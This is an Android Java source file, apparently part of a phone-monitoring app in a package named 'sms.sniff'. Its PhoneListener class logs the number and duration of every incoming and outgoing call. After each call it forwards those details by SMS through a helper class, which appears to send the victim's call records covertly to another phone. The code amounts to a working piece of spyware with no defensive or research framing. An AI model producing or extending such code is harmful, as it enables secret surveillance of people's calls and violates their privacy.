package sms.sniff.call;

import java.util.Calendar;

import sms.sniff.utils.SMS;
import sms.sniff.utils.Utils;
import android.content.Intent;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

public class PhoneListener extends PhoneStateListener{
	
	private long startedAt;
	private long finishedAt;
	private Intent intent;
	private String phoneNumber;
	private String msg;

	@Override
	public void onCallStateChanged(int state, String incomingNumber) {
		
		if(state == TelephonyManager.CALL_STATE_RINGING) {
			msg = "<<< ";
			phoneNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
		}
        
        if(state == TelephonyManager.CALL_STATE_OFFHOOK) {
			startedAt = Calendar.getInstance().getTimeInMillis();
			if (phoneNumber == null) {
				msg = ">>> ";
				phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
        	}
		} 
        
        if(state == TelephonyManager.CALL_STATE_IDLE && startedAt > 0) {
			finishedAt = Calendar.getInstance().getTimeInMillis();
			String duration = new Utils().format(finishedAt - startedAt, "mm:ss");
			startedAt = -1;
			
			new SMS(msg + phoneNumber + " - Duracao: " + duration).sendComparingWith(phoneNumber);
			
			phoneNumber = null;
		}
	}

	public void setIntent(Intent intent) {
		this.intent = intent;
	}
}
